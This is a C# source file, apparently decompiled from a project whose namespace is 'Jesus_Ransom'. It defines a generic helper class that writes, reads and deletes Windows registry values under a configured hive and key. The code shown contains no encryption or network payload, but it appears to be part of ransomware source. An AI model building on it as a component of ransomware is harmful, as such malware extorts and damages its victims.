using System;
using System.Text;
using Microsoft.Win32;

namespace Jesus_Ransom;

internal class RegValue : IRegValue, IDisposable
{
	private RegistryKey reg;

	public void CreateBinary(string name, byte[] value)
	{
		if (string.IsNullOrEmpty(name))
		{
			throw new ArgumentNullException("name is empty");
		}
		if (Config.HKEY == HKEY.ClassesRoot)
		{
			reg = Registry.ClassesRoot.OpenSubKey(Config.Address, writable: true);
		}
		else if (Config.HKEY == HKEY.CurrentUser)
		{
			reg = Registry.CurrentUser.OpenSubKey(Config.Address, writable: true);
		}
		else if (Config.HKEY == HKEY.LocalMachine)
		{
			reg = Registry.LocalMachine.OpenSubKey(Config.Address, writable: true);
		}
		else if (Config.HKEY == HKEY.Users)
		{
			reg = Registry.Users.OpenSubKey(Config.Address, writable: true);
		}
		else
		{
			reg = Registry.CurrentConfig.OpenSubKey(Config.Address, writable: true);
		}
		reg.SetValue(name, value, RegistryValueKind.Binary);
		reg.Close();
	}

	public void CreateBinary(string name, string value, Encoding encoding)
	{
		if (string.IsNullOrEmpty(name))
		{
			throw new ArgumentNullException("name is empty");
		}
		if (Config.HKEY == HKEY.ClassesRoot)
		{
			reg = Registry.ClassesRoot.OpenSubKey(Config.Address, writable: true);
		}
		else if (Config.HKEY == HKEY.CurrentUser)
		{
			reg = Registry.CurrentUser.OpenSubKey(Config.Address, writable: true);
		}
		else if (Config.HKEY == HKEY.LocalMachine)
		{
			reg = Registry.LocalMachine.OpenSubKey(Config.Address, writable: true);
		}
		else if (Config.HKEY == HKEY.Users)
		{
			reg = Registry.Users.OpenSubKey(Config.Address, writable: true);
		}
		else
		{
			reg = Registry.CurrentConfig.OpenSubKey(Config.Address, writable: true);
		}
		byte[] bytes = encoding.GetBytes(value);
		reg.SetValue(name, bytes, RegistryValueKind.Binary);
		reg.Close();
	}

	public void CreateDWord(string name, int value)
	{
		if (string.IsNullOrEmpty(name))
		{
			throw new ArgumentNullException("name is empty");
		}
		if (Config.HKEY == HKEY.ClassesRoot)
		{
			reg = Registry.ClassesRoot.OpenSubKey(Config.Address, writable: true);
		}
		else if (Config.HKEY == HKEY.CurrentUser)
		{
			reg = Registry.CurrentUser.OpenSubKey(Config.Address, writable: true);
		}
		else if (Config.HKEY == HKEY.LocalMachine)
		{
			reg = Registry.LocalMachine.OpenSubKey(Config.Address, writable: true);
		}
		else if (Config.HKEY == HKEY.Users)
		{
			reg = Registry.Users.OpenSubKey(Config.Address, writable: true);
		}
		else
		{
			reg = Registry.CurrentConfig.OpenSubKey(Config.Address, writable: true);
		}
		reg.SetValue(name, value, RegistryValueKind.DWord);
		reg.Close();
	}

	public void CreateExpandString(string name, string value)
	{
		if (string.IsNullOrEmpty(name))
		{
			throw new ArgumentNullException("name is empty");
		}
		if (Config.HKEY == HKEY.ClassesRoot)
		{
			reg = Registry.ClassesRoot.OpenSubKey(Config.Address, writable: true);
		}
		else if (Config.HKEY == HKEY.CurrentUser)
		{
			reg = Registry.CurrentUser.OpenSubKey(Config.Address, writable: true);
		}
		else if (Config.HKEY == HKEY.LocalMachine)
		{
			reg = Registry.LocalMachine.OpenSubKey(Config.Address, writable: true);
		}
		else if (Config.HKEY == HKEY.Users)
		{
			reg = Registry.Users.OpenSubKey(Config.Address, writable: true);
		}
		else
		{
			reg = Registry.CurrentConfig.OpenSubKey(Config.Address, writable: true);
		}
		reg.SetValue(name, value, RegistryValueKind.ExpandString);
		reg.Close();
	}

	public void CreateMultiString(string name, string[] value)
	{
		if (string.IsNullOrEmpty(name))
		{
			throw new ArgumentNullException("name is empty");
		}
		if (Config.HKEY == HKEY.ClassesRoot)
		{
			reg = Registry.ClassesRoot.OpenSubKey(Config.Address, writable: true);
		}
		else if (Config.HKEY == HKEY.CurrentUser)
		{
			reg = Registry.CurrentUser.OpenSubKey(Config.Address, writable: true);
		}
		else if (Config.HKEY == HKEY.LocalMachine)
		{
			reg = Registry.LocalMachine.OpenSubKey(Config.Address, writable: true);
		}
		else if (Config.HKEY == HKEY.Users)
		{
			reg = Registry.Users.OpenSubKey(Config.Address, writable: true);
		}
		else
		{
			reg = Registry.CurrentConfig.OpenSubKey(Config.Address, writable: true);
		}
		reg.SetValue(name, value, RegistryValueKind.MultiString);
		reg.Close();
	}

	public void CreateQWord(string name, int value)
	{
		if (string.IsNullOrEmpty(name))
		{
			throw new ArgumentNullException("name is empty");
		}
		if (Config.HKEY == HKEY.ClassesRoot)
		{
			reg = Registry.ClassesRoot.OpenSubKey(Config.Address, writable: true);
		}
		else if (Config.HKEY == HKEY.CurrentUser)
		{
			reg = Registry.CurrentUser.OpenSubKey(Config.Address, writable: true);
		}
		else if (Config.HKEY == HKEY.LocalMachine)
		{
			reg = Registry.LocalMachine.OpenSubKey(Config.Address, writable: true);
		}
		else if (Config.HKEY == HKEY.Users)
		{
			reg = Registry.Users.OpenSubKey(Config.Address, writable: true);
		}
		else
		{
			reg = Registry.CurrentConfig.OpenSubKey(Config.Address, writable: true);
		}
		reg.SetValue(name, value, RegistryValueKind.QWord);
		reg.Close();
	}

	public void CreateString(string name, string value)
	{
		if (string.IsNullOrEmpty(name))
		{
			throw new ArgumentNullException("name is empty");
		}
		if (Config.HKEY == HKEY.ClassesRoot)
		{
			reg = Registry.ClassesRoot.OpenSubKey(Config.Address, writable: true);
		}
		else if (Config.HKEY == HKEY.CurrentUser)
		{
			reg = Registry.CurrentUser.OpenSubKey(Config.Address, writable: true);
		}
		else if (Config.HKEY == HKEY.LocalMachine)
		{
			reg = Registry.LocalMachine.OpenSubKey(Config.Address, writable: true);
		}
		else if (Config.HKEY == HKEY.Users)
		{
			reg = Registry.Users.OpenSubKey(Config.Address, writable: true);
		}
		else
		{
			reg = Registry.CurrentConfig.OpenSubKey(Config.Address, writable: true);
		}
		reg.SetValue(name, value, RegistryValueKind.String);
		reg.Close();
	}

	public void CreateUnknown(string name, object value)
	{
		if (string.IsNullOrEmpty(name))
		{
			throw new ArgumentNullException("name is empty");
		}
		if (Config.HKEY == HKEY.ClassesRoot)
		{
			reg = Registry.ClassesRoot.OpenSubKey(Config.Address, writable: true);
		}
		else if (Config.HKEY == HKEY.CurrentUser)
		{
			reg = Registry.CurrentUser.OpenSubKey(Config.Address, writable: true);
		}
		else if (Config.HKEY == HKEY.LocalMachine)
		{
			reg = Registry.LocalMachine.OpenSubKey(Config.Address, writable: true);
		}
		else if (Config.HKEY == HKEY.Users)
		{
			reg = Registry.Users.OpenSubKey(Config.Address, writable: true);
		}
		else
		{
			reg = Registry.CurrentConfig.OpenSubKey(Config.Address, writable: true);
		}
		reg.SetValue(name, value, RegistryValueKind.Unknown);
		reg.Close();
	}

	public void Delete(string name)
	{
		if (string.IsNullOrEmpty(name))
		{
			throw new ArgumentNullException("name is empty");
		}
		if (Config.HKEY == HKEY.ClassesRoot)
		{
			reg = Registry.ClassesRoot.OpenSubKey(Config.Address, writable: true);
		}
		else if (Config.HKEY == HKEY.CurrentUser)
		{
			reg = Registry.CurrentUser.OpenSubKey(Config.Address, writable: true);
		}
		else if (Config.HKEY == HKEY.LocalMachine)
		{
			reg = Registry.LocalMachine.OpenSubKey(Config.Address, writable: true);
		}
		else if (Config.HKEY == HKEY.Users)
		{
			reg = Registry.Users.OpenSubKey(Config.Address, writable: true);
		}
		else
		{
			reg = Registry.CurrentConfig.OpenSubKey(Config.Address, writable: true);
		}
		if (reg.GetValue(name) != null)
		{
			reg.DeleteValue(name);
		}
		reg.Close();
	}

	public string[] GetNames()
	{
		if (Config.HKEY == HKEY.ClassesRoot)
		{
			reg = Registry.ClassesRoot.OpenSubKey(Config.Address, writable: true);
		}
		else if (Config.HKEY == HKEY.CurrentUser)
		{
			reg = Registry.CurrentUser.OpenSubKey(Config.Address, writable: true);
		}
		else if (Config.HKEY == HKEY.LocalMachine)
		{
			reg = Registry.LocalMachine.OpenSubKey(Config.Address, writable: true);
		}
		else if (Config.HKEY == HKEY.Users)
		{
			reg = Registry.Users.OpenSubKey(Config.Address, writable: true);
		}
		else
		{
			reg = Registry.CurrentConfig.OpenSubKey(Config.Address, writable: true);
		}
		string[] valueNames = reg.GetValueNames();
		reg.Close();
		return valueNames;
	}

	public object GetValue(string name)
	{
		if (string.IsNullOrEmpty(name))
		{
			throw new ArgumentNullException("name is empty");
		}
		if (Config.HKEY == HKEY.ClassesRoot)
		{
			reg = Registry.ClassesRoot.OpenSubKey(Config.Address, writable: true);
		}
		else if (Config.HKEY == HKEY.CurrentUser)
		{
			reg = Registry.CurrentUser.OpenSubKey(Config.Address, writable: true);
		}
		else if (Config.HKEY == HKEY.LocalMachine)
		{
			reg = Registry.LocalMachine.OpenSubKey(Config.Address, writable: true);
		}
		else if (Config.HKEY == HKEY.Users)
		{
			reg = Registry.Users.OpenSubKey(Config.Address, writable: true);
		}
		else
		{
			reg = Registry.CurrentConfig.OpenSubKey(Config.Address, writable: true);
		}
		object result = null;
		if (reg.GetValue(name) != null)
		{
			result = reg.GetValue(name);
		}
		reg.Close();
		return result;
	}

	public void Dispose()
	{
		reg.Close();
		reg.Dispose();
	}
}
